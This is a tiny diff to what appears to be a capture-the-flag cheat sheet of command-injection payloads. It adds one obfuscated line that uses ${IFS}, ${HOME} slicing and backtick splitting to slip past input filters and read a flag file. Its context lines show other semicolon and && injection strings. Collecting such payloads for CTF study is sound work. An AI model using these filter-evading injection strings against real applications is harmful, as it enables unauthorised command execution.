@@ -8,6 +8,7 @@ ls;pwd
 123;cat flag.txt
 ls;pwd&&ls
 'ls;ls${IFS}-la'
+$(cat${IFS}..${HOME:0:1}..${HOME:0:1}fl``ag.tx``t)
 ```
 
 Filtering
